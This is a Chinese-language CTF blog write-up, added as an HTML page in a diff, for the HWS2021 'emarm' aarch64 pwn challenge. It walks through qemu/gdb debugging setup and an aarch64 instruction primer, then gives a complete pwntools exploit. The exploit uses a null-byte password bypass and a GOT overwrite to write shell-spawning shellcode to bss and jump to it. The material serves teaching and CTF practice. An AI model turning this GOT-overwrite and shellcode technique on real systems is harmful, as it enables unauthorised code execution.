@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="PWN部分emarm关于调试到现在为止还没怎么打过异构的pwn，从这题开始记录一下 参考了这个师傅的文章，很详细 这题的是个aarch64架构的，环境大概要配下面这些 123456789# ARM软件包$ sudo apt-get install gcc-arm-linux-gnueabi$ sudo apt-get install gcc-aarch64-linux-gnu# qemu$ sud">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HWS2021入营赛复现">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="PWN部分emarm关于调试到现在为止还没怎么打过异构的pwn，从这题开始记录一下 参考了这个师傅的文章，很详细 这题的是个aarch64架构的，环境大概要配下面这些 123456789# ARM软件包$ sudo apt-get install gcc-arm-linux-gnueabi$ sudo apt-get install gcc-aarch64-linux-gnu# qemu$ sud">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-1.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-2.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-1.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-3.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-2.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-1.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-2.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-3.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-4.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-5.jpg">
+<meta property="og:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-6.jpg">
+<meta property="article:published_time" content="2023-07-07T02:48:02.000Z">
+<meta property="article:modified_time" content="2023-07-14T02:49:15.706Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="iot">
+<meta property="article:tag" content="hws">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-1.jpg">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HWS2021入营赛复现 | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HWS2021入营赛复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-07 10:48:02" itemprop="dateCreated datePublished" datetime="2023-07-07T10:48:02+08:00">2023-07-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-14 10:49:15" itemprop="dateModified" datetime="2023-07-14T10:49:15+08:00">2023-07-14</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PWN部分"><a href="#PWN部分" class="headerlink" title="PWN部分"></a>PWN部分</h1><h2 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h2><h3 id="关于调试"><a href="#关于调试" class="headerlink" title="关于调试"></a>关于调试</h3><p>到现在为止还没怎么打过异构的pwn，从这题开始记录一下</p>
+<p>参考了<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h1_0">这个师傅的文章</a>，很详细</p>
+<p>这题的是个aarch64架构的，环境大概要配下面这些</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ARM软件包</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-arm-linux-gnueabi</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gcc-aarch64-linux-gnu</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install qemu-user qemu-system</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> gdb-multiarch 用于异构程序的调试</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install gdb-multiarch</span></span><br></pre></td></tr></table></figure>
+
+<p>在没安装软件包之前运行程序的话是这样的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./emarm</span> </span><br><span class="line">bash: ./emarm: cannot execute binary file: Exec format error</span><br></pre></td></tr></table></figure>
+
+<p>安装完了之后是这样的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./emarm</span> </span><br><span class="line">/lib/ld-linux-aarch64.so.1: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>很明显是能运行了，只是缺动态链接库</p>
+<p>在前面安装完ARM的软件包之后，在<code>/usr</code>目录下会出现下面这三个东西</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/usr$</span><span class="bash"> ls</span></span><br><span class="line">aarch64-linux-gnu  arm-linux-gnueabi  arm-linux-gnueabihf</span><br></pre></td></tr></table></figure>
+
+<p>对应的动态链接库就在里面，可以使用<code>qemu-aarch -L /usr/aarch64-linux-gnu</code>来指定，但是这里就存在一些问题，第一个是这个动态链接库的版本是对应你本机的版本的，例如Ubuntu16.04就是glibc-2.23，可能跟远程环境不一样，第二个是这里面的链接库是没调试符号的，所以调起来很难看</p>
+<p>按着那个师傅的文章里讲的去下载源码然后自己编译，一方面能得到源码，另一方面能得到有调试符号的链接库文件</p>
+<p>然后就可以在qemu启动时指定链接库的位置了</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat run.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">qemu-aarch64 \</span><br><span class="line">	-g 1234 \</span><br><span class="line">	-L ./ ./emarm</span><br></pre></td></tr></table></figure>
+
+<p>有一点比较奇怪的是我最开始给<code>-L</code>的链接库位置是个绝对路径（跟程序不在同一目录下），但是试了下发现好像没办法加载，把编译出来的<code>lib</code>文件夹放到当前目录下，然后用<code>./</code>就可以加载，不知道为啥</p>
+<p>第二个问题是我Ubuntu22.04的gdb（gdb-12）尝试去remote到这个起的程序时会崩溃，如下报错</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Starting program: /home/charon/Desktop/HWS/PWN/EMARM/emarm </span><br><span class="line">/build/gdb-ZgDh0V/gdb-12.1/gdb/i387-tdep.c:597: internal-error: i387_supply_fxsave: Assertion `tdep-&gt;num_xmm_regs &gt; 0&#x27; failed.</span><br><span class="line">A problem internal to GDB has been detected,</span><br><span class="line">further debugging may prove unreliable.</span><br><span class="line">----- Backtrace -----</span><br><span class="line">0x56402e5a2197 ???</span><br><span class="line">......</span><br><span class="line">0x56402e4cc0ef ???</span><br><span class="line">0x7f826b363d8f __libc_start_call_main</span><br><span class="line">	../sysdeps/nptl/libc_start_call_main.h:58</span><br><span class="line">0x7f826b363e3f __libc_start_main_impl</span><br><span class="line">	../csu/libc-start.c:392</span><br><span class="line">0x56402e4d1e24 ???</span><br><span class="line">0xffffffffffffffff ???</span><br><span class="line">---------------------</span><br><span class="line"></span><br><span class="line">This is a bug, please report it.  For instructions, see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br></pre></td></tr></table></figure>
+
+<p>看起来像gdb的问题，上网搜了下好像是gdb-12会有这个问题，而且似乎没修复？解决的办法是卸载重新编译到更老版本的gdb（例如11.2）</p>
+<p>搞定调试的问题后就可以正常调了</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-1.jpg" class>
+
+<h4 id="关于架构"><a href="#关于架构" class="headerlink" title="关于架构"></a>关于架构</h4><p>刚开始接触新的架构的问题在于指令集和寄存器的熟悉，这里记录下关于aarch64的</p>
+<p>首先是寄存器，aarch64有31个通用寄存器（如上图，SP也叫X30寄存器），这些寄存器也可以用作32位的（叫W0-W30）</p>
+<p>此外还有一组32个用作浮点计算的寄存器，如下，<code>Bx</code>是8位寄存器、<code>Hx</code>是16位、<code>Sx</code>是32位、<code>Dx</code>是64位、<code>Qx</code>是128位，这里只做了解即可，以及跟浮点相关的汇编都是以<code>F</code>开头的</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-2.jpg" class>
+
+<h5 id="加载和存储"><a href="#加载和存储" class="headerlink" title="加载和存储"></a>加载和存储</h5><p>基本的加载和存储操作是：（<code>LDR</code>加载）和<code>STR</code>（存储）。这些操作在内存和通用寄存器之间传输单个值。这些指令的语法是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR&lt;Sign&gt;&lt;Size&gt;   &lt;Destination&gt;, [&lt;address&gt;]</span><br><span class="line">STR&lt;Size&gt;         &lt;Source&gt;, [&lt;address&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>存储和加载操作的大小由寄存器来决定，比如W就表示32位，X就表示64位，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR        W0, [&lt;address&gt;]</span><br><span class="line">LDR        X0, [&lt;address&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>也可以在指令中显式地指出操作长度，下面指令中的后缀分别表示字节(B)、半字(H)、字(W)，意思是把W0的低一字节、低两字节/X0的低四字节存到addr中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STRB       W0, [&lt;address&gt;]	# 8位</span><br><span class="line">STRH       W0, [&lt;address&gt;]	# 16位</span><br><span class="line">STRW       X0, [&lt;address&gt;]	# 32位</span><br></pre></td></tr></table></figure>
+
+<p>ldr指令也是类似的，但是这里除了操作长度外，还涉及符号拓展</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDRB       W0, [&lt;address&gt;]  # 从addr中取出一个字节的数据，零拓展到W0对应的大小（四个字节），然后存到W0中</span><br><span class="line">LDRSB      W0, [&lt;address&gt;]	# 同上，但是用符号拓展</span><br></pre></td></tr></table></figure>
+
+<p>接着往下，寻址方法，结合下面图片来看其实就很清晰了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LDR  W0,  [X1]			# 基址寄存器，直接取X1指向的地址</span><br><span class="line">LDR  W0,  [X1, #12]		# 偏移寻址模式，取 X1+12 的地址</span><br><span class="line">LDR  W0,  [X1, #12]!	# 预索引寻址模式，跟前面一样，只是会把 X1+12 的结果更新到X1</span><br><span class="line">LDR  W0,  [X1], #12		# 后索引寻址模式，取的是X1的地址，然后会把 X1+12 的结果更新到X1</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-1.jpg" class>
+
+<p>此外，aarch64还有加载/存储对指令（注意是<code>LDP</code>和<code>STP</code>），如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDP  W0, W1, [X1]	# 取[X1]给W0，取[X1+4]给W1</span><br><span class="line">STP  D0, D1, [X1]	# 把D0写到[X1]，把D1写到[X1+8] (D0是64位寄存器)</span><br></pre></td></tr></table></figure>
+
+<p>加载/存储对指令常用在堆栈操作上，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STP  X0, X1, [SP, #-16]!	# X0存到[SP-16]，X1存到[SP-8]，SP=SP-16</span><br><span class="line">LDP  X0, X1, [SP], #16		# 取[SP]给X0，取[SP+8]给X1，然后SP=SP+16</span><br></pre></td></tr></table></figure>
+
+<h5 id="位拓展"><a href="#位拓展" class="headerlink" title="位拓展"></a>位拓展</h5><p>可以分成符号拓展<code>SXTx</code>和无符号拓展<code>UXTx</code>两种，<code>x</code>决定的是<strong>被拓展的数据的大小</strong>，而拓展到多少取决于目的操作数的寄存器，从下面这张图来看就很容易理解了</p>
+<p>例如<code>SXTB    W1, W0</code>，就表示从W0中（不是<code>[W0]</code>）取出一个字节的数据，符号拓展成W1对应大小（也就是32位），然后存到W1里</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/aarch64-3.jpg" class>
+
+<h5 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h5><p>无条件的跳转指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这两条跳转指令都不会保存返回地址，直接jmp</span><br><span class="line">B	&lt;label&gt;		# 跳转到label处</span><br><span class="line">BR	&lt;Xn&gt;		# 跳转到Xn处</span><br><span class="line"># 这两条跳转指令会保存下一条指令的地址到链接寄存器里(LP)，从而可以在后续的流程里实现返回</span><br><span class="line">BL	&lt;label&gt;</span><br><span class="line">BLR	&lt;Xn&gt;</span><br></pre></td></tr></table></figure>
+
+<p>条件跳转指令也类似：<code>B.&lt;cond&gt; &lt;label&gt;</code>，例如<code>B.NE    skip</code>、<code>B.EQ    label</code>等等（NE是不相等、EQ是相等）</p>
+<p>条件跳转指令的cond取决于<code>PSTATE</code>寄存器中的<code>ALU</code>标志位</p>
+<p>aarch64不太一样的一点在于其可以在指令中显式地指出这条指令要不要取更新<code>ALU</code>标志位，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADD		X0, X1, X2	# 不更新标志位</span><br><span class="line">ADDS 	X0, X1, X2	# 更新标志位</span><br></pre></td></tr></table></figure>
+
+<h5 id="PCS"><a href="#PCS" class="headerlink" title="PCS"></a>PCS</h5><p>跟函数调用约定类似，Arm架构下称作过程调用标准 (Procedure Call Standard)，其规定了函数传参的规则和返回值保存在哪，此外不太一样的地方在于PCS还规定了在函数调用期间有哪些寄存器是不能/能被破坏的，简单来说就是有些寄存器在函数调用前后不应该变化，其做法就是会把不能被破坏的寄存器提前push到栈上，结束后再恢复</p>
+<h5 id="加减乘除之类的"><a href="#加减乘除之类的" class="headerlink" title="加减乘除之类的"></a>加减乘除之类的</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADD		X0, X1, X2		# X0 = X1 + X2</span><br><span class="line">SUB		X0, X1, X2		# X0 = X1 - X2</span><br><span class="line">ASR     X20, X20, #3	# X20 = X20 &gt;&gt; 3</span><br><span class="line">LSL		X20, X20, #3	# X20 = X20 &lt;&lt; 3</span><br><span class="line">LDR     X3, [X21,X19,LSL#3]	# 取[X21 + X19 &lt;&lt; 3]给X3</span><br></pre></td></tr></table></figure>
+
+<h3 id="关于题目"><a href="#关于题目" class="headerlink" title="关于题目"></a>关于题目</h3><p>了解完前面说的调试问题和架构相关的问题后就可以过到题目了</p>
+<p>保护如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec emarm</span><br><span class="line">[*] &#x27;/home/giantbranch/Desktop/HWS/emarm&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>程序主逻辑如下，其实很简单的题目，<code>\x00</code>绕过随机数后用给的任意地址写改got表就行了</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/emarm-2.jpg" class>
+
+<p>此外就是由于aarch64架构的返回方式不像x86那样用<code>leave; ret</code>来返回，所以其实是可以直接劫持got表跳回到函数中间的某一段的，按流程来看似乎也不会，这题选择跳回的点就是红框那，劫持的函数是<code>fread</code>还是<code>fclose</code>都没有什么区别（我最开始改的是fclose，发现一开始可以的，过一天后忽然又不行了，会因为一个非法地址引用崩在fread里，还不知道为啥会这样）</p>
+<p>实现无限循环之后就有无限制的任意地址写了，这里还涉及到的一个点是关于qemu的，还是那个师傅的博客：</p>
+<blockquote>
+<p>先说说<code>qemu</code>吧，在<code>CTF</code>比赛中，绝大多数<code>ARM</code>架构的题都是在<code>qemu</code>模拟出的环境中跑的，而<code>qemu</code>有些不太安全的特性，比如它没有地址的随机化，也没有<code>NX</code>保护，即使题目所给的二进制文件开了<code>NX</code>和<code>PIE</code>保护，也只是对真机环境奏效，而在<code>qemu</code>中跑的时候，仍然相当于没有这些保护，也就是说，<code>qemu</code>中所有地址都是有可执行权限的（包括堆栈，甚至<code>bss</code>段等），然后<code>libc_base</code>和<code>elf_base</code>每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露<code>libc_base</code>这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。</p>
+</blockquote>
+<p>所以如果远程是用qemu跑的程序而不是真机的话，那么就大概可以有两种思路，一个是直接在bss段上写shellcode，然后跳过去，第二个是构造一个泄露，泄露远程的libc地址，然后got表改og就行，这里我用的方法是ret2shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process([&#x27;qemu-aarch64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;, &#x27;./emarm&#x27;])</span></span><br><span class="line">p = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./emarm&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fread = <span class="number">0x412060</span></span><br><span class="line">fclose = <span class="number">0x412018</span></span><br><span class="line">start = <span class="number">0x4008C0</span></span><br><span class="line">main_read = <span class="number">0x400BE4</span></span><br><span class="line">bss = <span class="number">0x412090</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;passwd:&quot;</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x412060</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;you will success&quot;</span>, p64(main_read))</span><br><span class="line">p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">0x412090</span>+i*<span class="number">8</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;you will success&quot;</span>, shellcode[<span class="number">0</span>+i*<span class="number">8</span>:<span class="number">8</span>+i*<span class="number">8</span>])</span><br><span class="line">	p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x412090</span>+<span class="number">40</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;you will success&quot;</span>, shellcode[<span class="number">40</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">0x412060</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;you will success&quot;</span>, p64(<span class="number">0x412090</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;i leave for you bye&quot;</span>,<span class="string">b&#x27;0001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>也顺便记一下起gdb的脚本</p>
